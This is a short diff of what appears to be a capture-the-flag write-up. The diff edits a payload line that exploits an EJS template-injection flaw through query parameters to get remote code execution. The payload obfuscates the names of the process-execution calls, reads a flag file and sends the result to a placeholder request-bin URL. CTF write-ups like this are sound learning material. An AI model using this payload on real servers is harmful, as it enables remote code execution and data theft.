@@ -937,7 +937,7 @@ app.get(
 in source code, it render with `res.status(404).render("error", req.query);` if no user matches.
 trigger rce with ejs vulnerability.
 ```javascript
-settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {% raw %}{{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}}{% endraw %});})&settings[view options][client]=1&settings[view options][debug]=1
+settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}});})&settings[view options][client]=1&settings[view options][debug]=1
 ```
 
 ```javascript
